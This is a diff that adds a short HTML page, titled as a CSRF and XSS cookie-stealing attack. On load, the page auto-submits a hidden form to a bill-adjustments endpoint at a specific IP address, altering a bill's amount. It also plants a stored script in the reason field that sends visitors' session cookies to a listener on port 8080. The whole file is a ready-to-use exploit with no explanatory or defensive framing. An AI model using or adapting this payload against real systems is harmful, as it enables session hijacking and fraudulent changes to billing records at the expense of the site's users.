@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF XSS Cookie Stealing Attack</title>
+</head>
+<body onload="document.forms[0].submit()">
+    <form action="https://140.245.27.133/bill-adjustments" method="POST">
+        <input type="hidden" name="bill_id" value="799">
+        <input type="hidden" name="officer_name" value="Hacker">
+        <input type="hidden" name="officer_designation" value="Cyber Criminal">
+        <input type="hidden" name="original_bill_amount" value="5000">
+        <input type="hidden" name="adjustment_amount" value="1000">
+        <input type="hidden" name="adjustment_reason" value='<script>fetch("https://140.245.27.133:8080/?cookie=" + document.cookie);</script>'>
+    </form>
+</body>
+</html>
